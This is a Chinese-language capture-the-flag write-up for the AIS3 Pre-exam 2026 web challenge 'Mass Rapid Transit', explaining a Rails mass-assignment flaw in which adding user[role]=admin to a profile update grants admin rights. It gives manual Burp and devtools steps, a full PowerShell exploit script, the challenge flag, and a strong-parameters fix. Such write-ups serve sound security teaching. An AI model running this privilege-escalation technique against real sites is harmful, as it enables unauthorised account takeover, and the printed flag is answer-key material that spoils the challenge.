# AIS3 Pre-exam 2026 Web - Mass Rapid Transit Write-up

## 題目資訊

- 題目名稱：Mass Rapid Transit
- 題目類型：Web
- 題目說明：AIS 捷運公司（AIS Transit Corporation）官方資訊平台已上線，歡迎旅客註冊使用。
- 目標網址：`http://chals1.ais3.org:10003/`
- Flag 格式：`AIS3{...}`

## 解題摘要

這題是一個 Rails 網站，核心漏洞是 **Mass Assignment**。網站允許一般使用者在 `/profile` 更新個人資料，但後端沒有正確限制可更新欄位，導致我們可以額外送出 `user[role]=admin`，把自己的帳號角色改成管理員。

取得管理員權限後，進入 `/admin` 即可看到 flag。

最終 flag：

```text
AIS3{R41ls_4P1_M4ss_4ss1gnm3nt_2_AIS_4dm1n}
```

## 偵察過程

進入首頁後，可以看到這是一個捷運公司資訊平台，功能包含：

- 首頁
- 路網圖
- 車站資訊
- 失物招領
- 乘車須知
- 關於本公司
- 登入與註冊

觀察 HTML 時，可以看到 Rails 常見的 CSRF token：

```html
<meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="..." />
```

表單中也有：

```html
<input type="hidden" name="authenticity_token" value="..." />
```

因此可以判斷這個網站很可能是 Ruby on Rails。

接著檢查 `robots.txt`：

```powershell
Invoke-WebRequest -Uri 'http://chals1.ais3.org:10003/robots.txt' -UseBasicParsing
```

回應如下：

```text
User-agent: *
Disallow: /admin
```

這表示存在 `/admin` 路由。直接訪問 `/admin` 時，會被導回首頁並顯示：

```text
此頁面需要管理員權限。
```

所以目標變成：取得管理員權限。

## 嘗試方向

題目名稱是 `Mass Rapid Transit`，其中 `Mass` 加上 Rails 框架提示，很容易聯想到 Rails 常見的 **Mass Assignment** 問題。

Mass Assignment 的問題通常發生在後端直接接受使用者傳入的物件欄位，例如：

```ruby
current_user.update(params[:user])
```

或 strong parameters 設定不嚴謹，導致使用者可以多塞原本不應該修改的欄位，例如：

```text
user[role]=admin
user[admin]=1
user[is_admin]=1
```

一開始我在註冊時嘗試加入：

```text
user[admin]=1
user[is_admin]=1
user[role]=admin
```

但註冊後仍然不是管理員，代表註冊流程可能有過濾這些欄位。

登入後查看 `/profile`，發現個人資料更新表單如下：

```html
<form action="/profile" method="post">
  <input type="hidden" name="_method" value="patch" />
  <input type="text" name="user[username]" />
  <input type="email" name="user[email]" />
  <input type="text" name="user[full_name]" />
  <input type="tel" name="user[phone]" />
  <input type="text" name="user[favorite_station]" />
  <input type="password" name="user[password]" />
</form>
```

這裡是更新 User model 的功能，很適合測試 Mass Assignment。

## 漏洞利用流程

### 1. 註冊一般帳號

先進入 `/signup` 拿 CSRF token，然後註冊帳號。

必要欄位如下：

```text
authenticity_token=<CSRF token>
user[username]=testuser
user[email]=testuser@example.com
user[full_name]=Test User
user[password]=password123
user[password_confirmation]=password123
```

### 2. 進入個人資料頁

註冊並登入後，進入：

```text
/profile
```

從表單中取得新的 `authenticity_token`。

### 3. 修改個人資料時額外送出 role

送出原本表單欄位之外，再額外加上：

```text
user[role]=admin
```

完整概念如下：

```text
_method=patch
authenticity_token=<CSRF token>
user[username]=testuser
user[email]=testuser@example.com
user[full_name]=Test User
user[phone]=123
user[favorite_station]=Central
user[role]=admin
```

送出後，帳號角色會被更新成管理員。

### 4. 進入 /admin

再次訪問：

```text
http://chals1.ais3.org:10003/admin
```

即可進入管理後台並看到 flag。

## 從網頁畫面手動復現

這一段用「你在網頁上會看到什麼」的方式描述復現流程。因為真正的漏洞利用需要額外塞入 `user[role]=admin`，一般瀏覽器表單不會直接出現這個欄位，所以最後一步需要搭配瀏覽器開發者工具、Burp Suite，或直接改 HTTP request。

### 1. 打開首頁

進入：

```text
http://chals1.ais3.org:10003/
```

畫面會是一個「AIS 捷運公司」官方網站。上方導覽列可以看到：

- 首頁
- 路網圖
- 車站資訊
- 失物招領
- 乘車須知
- 關於本公司

右上角會有兩個帳號相關按鈕：

- 登入
- 旅客註冊

這裡點右上角的 **旅客註冊**。

### 2. 註冊旅客帳號

進入註冊頁後，頁面標題會是：

```text
旅客帳號註冊
```

畫面中央會有一張表單卡片，裡面有這些欄位：

- 帳號名稱
- 電子郵件
- 姓名
- 密碼
- 確認密碼

可以隨便註冊一組帳號，例如：

```text
帳號名稱：testuser123
電子郵件：testuser123@example.com
姓名：Test User
密碼：password123
確認密碼：password123
```

填完後，點右下角的 **建立帳號**。

註冊成功後，右上角原本的「登入 / 旅客註冊」會變成已登入狀態，通常會看到 **個人帳號**、**登出** 之類的按鈕。

### 3. 觀察一般帳號權限

這時如果直接進入：

```text
http://chals1.ais3.org:10003/admin
```

畫面會被導回首頁，並在主內容上方出現提示訊息：

```text
此頁面需要管理員權限。
```

這代表目前只是普通旅客帳號，還不是管理員。

### 4. 進入個人帳號設定頁

回到網站右上角，點 **個人帳號**。

你會進入：

```text
/profile
```

頁面標題會是：

```text
個人帳號設定
```

標題下方會顯示你的 email，旁邊會有一個身份 badge：

```text
旅客
```

這個 `旅客` 就是目前角色。接著下面會看到一張個人資料表單，包含：

- 帳號名稱
- 電子郵件
- 姓名
- 聯絡電話
- 常用車站
- 新密碼（留空則不變更）

最下面有一個按鈕：

```text
儲存變更
```

正常來說，這個頁面只能修改個人資料。但漏洞點就在這裡：後端額外接受了畫面上沒有顯示的 `role` 欄位。

### 5. 攔截或修改「儲存變更」請求

接下來有兩種常見做法。

第一種是用 Burp Suite：

1. 開啟 Burp Suite Proxy。
2. 瀏覽器設定代理。
3. 在 `/profile` 頁面隨便修改一個欄位，例如「聯絡電話」填 `123`。
4. 點 **儲存變更**。
5. Burp 會攔到一個送往 `/profile` 的 POST request。

你會看到 request body 裡大概有：

```text
_method=patch
authenticity_token=...
user[username]=...
user[email]=...
user[full_name]=...
user[phone]=123
user[favorite_station]=...
user[password]=
```

在 body 最後補上：

```text
user[role]=admin
```

送出後，帳號就會被升級成管理員。

第二種是用瀏覽器開發者工具：

1. 在 `/profile` 頁面按 `F12`。
2. 找到個人資料表單。
3. 在表單裡手動新增一個 hidden input。

新增的 input 長這樣：

```html
<input type="hidden" name="user[role]" value="admin">
```

然後回到頁面，點 **儲存變更**。

### 6. 確認身份變成管理員

更新成功後，再看 `/profile` 頁面標題下方的身份 badge。

原本會顯示：

```text
旅客
```

成功後會變成：

```text
管理員
```

這表示 Mass Assignment 已經成功。

### 7. 進入管理後台

最後再次進入：

```text
http://chals1.ais3.org:10003/admin
```

這次不會再出現「此頁面需要管理員權限」。

你會看到管理後台頁面，頁面中會出現 flag：

```text
AIS3{R41ls_4P1_M4ss_4ss1gnm3nt_2_AIS_4dm1n}
```

## PowerShell 重現腳本

以下腳本會自動：

1. 建立 session
2. 取得註冊頁 CSRF token
3. 註冊帳號
4. 取得 profile 頁 CSRF token
5. 送出 `user[role]=admin`
6. 進入 `/admin` 抓取 flag

```powershell
$base = 'http://chals1.ais3.org:10003/'
$s = New-Object Microsoft.PowerShell.Commands.WebRequestSession

# 1. 取得 signup CSRF token
$r = Invoke-WebRequest -Uri ($base + 'signup') -WebSession $s -UseBasicParsing
$token = [regex]::Match($r.Content, 'name="authenticity_token" value="([^"]+)"').Groups[1].Value

# 2. 註冊帳號
$u = 'writeup' + (Get-Random)
$body = @{
  'authenticity_token' = $token
  'user[username]' = $u
  'user[email]' = ($u + '@example.com')
  'user[full_name]' = 'Writeup User'
  'user[password]' = 'password123'
  'user[password_confirmation]' = 'password123'
}

Invoke-WebRequest -Uri ($base + 'signup') `
  -Method Post `
  -Body $body `
  -WebSession $s `
  -UseBasicParsing | Out-Null

# 3. 取得 profile CSRF token
$p = Invoke-WebRequest -Uri ($base + 'profile') -WebSession $s -UseBasicParsing
$ptoken = [regex]::Match(
  $p.Content,
  'action="/profile"[\s\S]*?name="authenticity_token" value="([^"]+)"'
).Groups[1].Value

# 4. Mass Assignment：額外加入 user[role]=admin
$body2 = @{
  '_method' = 'patch'
  'authenticity_token' = $ptoken
  'user[username]' = $u
  'user[email]' = ($u + '@example.com')
  'user[full_name]' = 'Writeup User'
  'user[phone]' = '123'
  'user[favorite_station]' = 'Central'
  'user[role]' = 'admin'
}

Invoke-WebRequest -Uri ($base + 'profile') `
  -Method Post `
  -Body $body2 `
  -WebSession $s `
  -UseBasicParsing | Out-Null

# 5. 讀取 admin 頁並擷取 flag
$a = Invoke-WebRequest -Uri ($base + 'admin') -WebSession $s -UseBasicParsing
([regex]::Match($a.Content, 'AIS3\{[^}]+\}')).Value
```

執行結果：

```text
AIS3{R41ls_4P1_M4ss_4ss1gnm3nt_2_AIS_4dm1n}
```

## 為什麼這會成功

一般來說，使用者可以修改自己的：

- username
- email
- full_name
- phone
- favorite_station
- password

但不應該能修改：

- role
- admin
- is_admin
- permission

這題的 `/profile` 更新功能接受了 `user[role]`，因此攻擊者可以透過普通個人資料更新請求，把自己的角色改成 `admin`。

這正是 Rails 題常見的 Mass Assignment / Strong Parameters 設定錯誤。

## 修補建議

後端應該明確限制 profile 可以更新的欄位，例如 Rails 中應該只允許：

```ruby
params.require(:user).permit(
  :username,
  :email,
  :full_name,
  :phone,
  :favorite_station,
  :password
)
```

不要允許使用者端傳入 `role`、`admin`、`is_admin` 等權限相關欄位。

另外，權限變更應該只存在於管理員專用功能中，並且由後端檢查目前操作者是否真的具備管理員權限。

## 結論

這題的重點不是 SQL Injection 或 XSS，而是從 Rails 特徵與題名 `Mass` 推測 Mass Assignment。透過 `/profile` 更新使用者資料時額外傳入 `user[role]=admin`，即可把一般帳號升級為管理員，最後進入 `/admin` 取得 flag。

Flag：

```text
AIS3{R41ls_4P1_M4ss_4ss1gnm3nt_2_AIS_4dm1n}
```
